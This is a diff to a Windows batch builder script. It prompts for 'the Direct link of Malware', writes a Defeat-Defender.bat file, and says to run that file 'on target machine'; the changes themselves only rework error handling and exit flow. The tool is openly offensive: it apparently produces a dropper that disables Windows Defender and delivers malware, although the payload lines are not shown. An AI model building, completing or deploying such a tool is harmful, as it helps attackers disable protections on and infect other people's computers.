@@ -4,7 +4,16 @@ color 0a
 echo.
 echo.
 set /p a="Enter the Direct link of  Malware : "
-if [%a%]==[] (goto error ) else (goto main)
+if [%a%]==[] ( 
+CALL:error
+pause
+EXIT /B %ERRORLEVEL% 
+) 
+if [%a%] NEQ [] (
+CALL:main
+pause
+EXIT /B %ERRORLEVEL% 
+)
 :main
 echo.
 echo Your  Url is :  %a% 
@@ -16,9 +25,7 @@ echo. >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
 echo.
 echo File Generated Successfully.Run Defeat-Defender.bat on target machine .
-pause
-exit /B 
+
 :error
 echo.
 echo Please Enter Link And Try Again!!!
-pause
